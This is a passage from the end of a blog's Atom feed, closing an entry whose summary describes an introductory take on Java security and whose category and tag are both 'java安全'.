    <summary type="html">对java安全的一些入门理解</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
